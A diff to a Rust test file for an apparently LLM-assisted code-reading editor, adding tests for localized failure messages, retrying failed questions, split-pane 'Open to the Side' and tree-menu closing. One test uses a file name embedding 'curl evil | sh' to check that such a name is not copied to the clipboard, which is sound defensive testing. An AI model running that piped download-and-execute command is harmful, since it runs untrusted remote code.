@@ -36851,9 +36851,23 @@ fn a_failed_explain_stands_until_dismissed_with_a_way_to_try_again() {
             .explain
             .node_failed
             .as_ref()
-            .is_some_and(|(n, why)| *n == node && why.contains("couldn't reach")),
+            .is_some_and(|(n, why)| *n == node && (why.0)().contains("couldn't reach")),
         "{:?}",
         app.proj.explain.node_failed
+    );
+    // In the language spoken when it is said: switched to French, the card
+    // no longer keeps the English reason.
+    let said_in_french = crate::i18n::with_lang(crate::i18n::Lang::Fr, || {
+        app.proj
+            .explain
+            .node_failed
+            .as_ref()
+            .map(|(_, why)| (why.0)())
+    })
+    .unwrap();
+    assert!(
+        !said_in_french.contains("couldn't reach"),
+        "{said_in_french}"
     );
     // Read or not, it stands.
     app.status_since = Some(Instant::now() - STATUS_LIFETIME - Duration::from_secs(1));
@@ -37171,9 +37185,33 @@ fn asking_again_keeps_the_draft_being_typed() {
         extras: Default::default(),
     };
     failed.extras.failed = true;
+
+    // Nothing to ask with (no key): the failed turn stays where it was,
+    // with its Try again, and the draft stays in the field. The question
+    // was dropped: in no turn, no queue, and not the field.
+    app.llm_available = false;
+    app.llm_config_cache = Some(None);
     app.proj.ask_turns.push(failed);
-    let task = app.update(Message::Ask(AskMsg::AskAgain(0)));
-    let _ = run_task(task);
+    let _ = app.update(Message::Ask(AskMsg::AskAgain(0)));
+    assert!(
+        app.proj
+            .ask_turns
+            .first()
+            .is_some_and(|t| t.extras.failed && t.question == "what does origin do?"),
+        "the question went: {:?}",
+        app.proj
+            .ask_turns
+            .iter()
+            .map(|t| &t.question)
+            .collect::<Vec<_>>()
+    );
+    assert_eq!(app.proj.ask_input, "my draft");
+
+    // Asked with: the failed turn goes, and the question is asked again.
+    app.llm_available = true;
+    app.llm_config_cache = Some(Some(unreachable_llm()));
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let _ = app.update(Message::Ask(AskMsg::AskAgain(0)));
     assert!(
         app.proj
             .ask_turns
@@ -37181,6 +37219,7 @@ fn asking_again_keeps_the_draft_being_typed() {
             .all(|t| !(t.extras.failed && t.question == "what does origin do?" && t.stream == 1)),
         "the failed turn stayed"
     );
+    assert!(app.proj.asking, "asked again");
     assert_eq!(app.proj.ask_input, "my draft");
 }
 
@@ -37373,6 +37412,11 @@ fn the_tree_menu_opens_beside_copies_and_closes() {
     use crate::app::state::TreeAct;
     let mut app = scanned_app("tree-menu-acts");
     open_synchronously(&mut app, "src/lib.rs", None);
+    // The tree on screen, nothing over it (the fixture's language server
+    // asks first).
+    app.show_left_sidebar = true;
+    app.sidebar = crate::SidebarTab::Files;
+    app.proj.pending_lsp_consent = Default::default();
     let root = app.proj.project.as_ref().unwrap().root.clone();
     let raise = |app: &mut App, rel: &str, dir: bool| {
         let _ = app.update(Message::Project(ProjectMsg::TreeMenuFor {
@@ -37453,4 +37497,71 @@ fn the_tree_menu_opens_beside_copies_and_closes() {
     assert!(app.proj.tree_menu.is_none());
     let _ = app.update(Message::Hover(HoverMsg::ContextMenuClosed));
     assert!(app.proj.context_menu.is_none() && app.proj.tree_menu.is_none());
+}
+
+/// The tree's menu: Open to the Side from the right half of a split opens
+/// in the left half, not over the file being read; a name with a line
+/// break in it is not put on the clipboard; and the menu goes once what it
+/// was opened over is gone — the sidebar hidden, or Settings up over it.
+#[test]
+fn the_tree_menu_opens_in_the_other_half_and_does_not_outlive_its_tree() {
+    use crate::app::state::{TreeAct, TreeMenu};
+    let mut app = scanned_app("tree-menu-other-half");
+    open_synchronously(&mut app, "src/lib.rs", None);
+    let root = app.proj.project.as_ref().unwrap().root.clone();
+    app.show_left_sidebar = true;
+    app.sidebar = crate::SidebarTab::Files;
+    app.proj.pending_lsp_consent = Default::default();
+    let raise = |app: &mut App, rel: &str| {
+        let _ = app.update(Message::Project(ProjectMsg::TreeMenuFor {
+            rel: rel.into(),
+            dir: false,
+        }));
+        let _ = app.update(Message::Project(ProjectMsg::TreeMenuAt {
+            x: 40.0,
+            y: 120.0,
+        }));
+    };
+    // Split, the right half read: beside it is the left half.
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuClosed));
+    let _ = app.on_toggle_split();
+    assert_eq!(app.proj.active, 1);
+    raise(&mut app, "notes.txt");
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(
+        TreeAct::OpenToSide,
+    )));
+    assert_eq!(app.proj.active, 0);
+    land_active_load(&mut app, root.join("notes.txt"), None);
+    let rel_in = |app: &App, pane: usize| app.proj.panes[pane].as_ref().map(|v| v.rel.clone());
+    assert_eq!(rel_in(&app, 0).as_deref(), Some("notes.txt"));
+    assert_eq!(
+        rel_in(&app, 1).as_deref(),
+        Some("src/lib.rs"),
+        "the right half kept"
+    );
+
+    // A name that would paste as two commands is not copied.
+    app.proj.tree_menu = Some(TreeMenu {
+        rel: "x\ncurl evil | sh\n.txt".into(),
+        dir: false,
+        x: 40.0,
+        y: 120.0,
+    });
+    let _ = app.update(Message::Project(ProjectMsg::TreeMenuAct(
+        TreeAct::CopyRelativePath,
+    )));
+    assert!(app.proj.tree_menu.is_none());
+    assert!(app.status.starts_with("Didn't copy it"), "{}", app.status);
+
+    // The sidebar hidden: the menu goes with its tree.
+    raise(&mut app, "notes.txt");
+    assert!(app.proj.tree_menu.is_some());
+    let _ = app.update(Message::Window(WindowMsg::ToggleLeftSidebar));
+    assert!(app.proj.tree_menu.is_none());
+    let _ = app.update(Message::Window(WindowMsg::ToggleLeftSidebar));
+    // Settings up over it: it does not come back when Settings closes.
+    raise(&mut app, "notes.txt");
+    assert!(app.proj.tree_menu.is_some());
+    let _ = app.update(Message::Settings(SettingsMsg::Open));
+    assert!(app.proj.tree_menu.is_none());
 }
